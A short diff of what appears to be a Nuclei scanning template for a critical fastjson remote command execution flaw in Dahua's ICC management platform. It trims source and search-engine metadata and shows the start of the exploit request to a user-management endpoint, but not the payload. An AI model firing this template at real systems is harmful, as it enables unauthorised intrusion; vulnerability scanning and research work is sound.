@@ -3,14 +3,8 @@ info:
   name: 大华智能物联综合管理平台(ICC)randomfastjson远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/295439e96e22e33d58438ee892ac1393
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 295439e96e22e33d58438ee892ac1393
-    fofa: + hunter`web.body="*客户端会小于800*"`
 http:
 - raw:
   - 'POST /evo-runs/v1.0/auths/sysusers/random HTTP/2
